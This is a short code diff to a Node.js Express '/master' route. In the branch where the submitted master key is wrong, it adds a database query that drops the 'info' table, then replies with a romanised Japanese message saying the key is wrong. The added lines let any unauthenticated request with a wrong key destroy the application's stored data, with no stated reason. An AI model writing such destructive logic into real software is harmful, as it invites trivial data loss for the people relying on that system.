@@ -72,6 +72,10 @@ app.post('/master', (req, res) => {
 			res.render('master', {info : result})
 		})
 	}else{
+		const sql = 'drop table if exists info';
+		con.query(sql, (err, result, fields) => {
+			if (err) throw err;
+		})
 		res.send('masterkey ga tigaimasu!')
 	}
 })
